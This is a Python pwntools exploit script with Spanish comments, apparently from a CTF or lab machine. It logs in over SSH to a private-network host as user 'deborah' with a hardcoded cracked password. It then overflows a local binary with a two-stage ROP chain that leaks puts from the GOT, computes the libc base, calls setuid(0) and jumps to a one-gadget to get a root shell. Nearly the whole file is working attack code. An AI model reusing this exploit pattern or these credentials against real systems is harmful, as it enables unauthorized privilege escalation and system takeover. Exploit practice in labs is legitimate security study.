from pwn import *

#### priv escalation deb root, binario remoto por SSH ####
#### el libc se podia descargar remoto con el acceso ssh ####

#### GDB SETUP ####
gdbscript = '''
break main
continue
'''
#### SSH CONN ####
### password de "crackear" el zip ####
deborah = ssh("deborah","10.4.4.50",22,"Silver13")

#### GADGETS y Address ####
poprdi = 0x40069b                   
vuln = 0x4005da     
puts_got =  0x601018
puts_plt =  0x4004a0
puts_offset =  0x809c0
setuid_offset = 0xe5970

#### BINARIOS ####
e = ELF('./lol')
#r = gdb.debug('./lol', gdbscript)
#r = process('./lol')
l = ELF('./libc.so.6')
r = deborah.process('/home/deborah/bin/lol')
#r = remote('10.4.4.50', 4488)

#### PAYLOAD PARA LEKEAR PUTS EN GOT ####
payload = "A" * 152
payload += p64(poprdi)
payload += p64(e.got['puts'])
payload += p64(e.plt['puts'])
payload += p64(vuln)

#### ENVIANDO PAYLOAD Y RECIBIENDO LA DIRECCION DE PUTS EN GOT ####
r.sendlineafter('busca?',payload)
r.recvuntil('aqui')
r.recvline()
leak1 = u64(r.recvline().strip().ljust(8,'\x00'))
print hex(leak1)

#### CALCULANDO LIBC BASE, SETUID y ONEGADGET en LIBC ####
libc = leak1 - l.symbols['puts']
#onegadget = libc + 0x4f2c5
setuid = libc + setuid_offset
print hex(libc)
onegadget = libc + 0x4f322

#### ENVIANDO SEGUNDO PAYLOAD y obteniendo shell ;) ####
exploit = "A" * 152
exploit += p64(poprdi)
exploit += p64(0x0)
exploit += p64(setuid)
exploit += p64(onegadget)
r.sendlineafter('busca?', exploit)
r.interactive()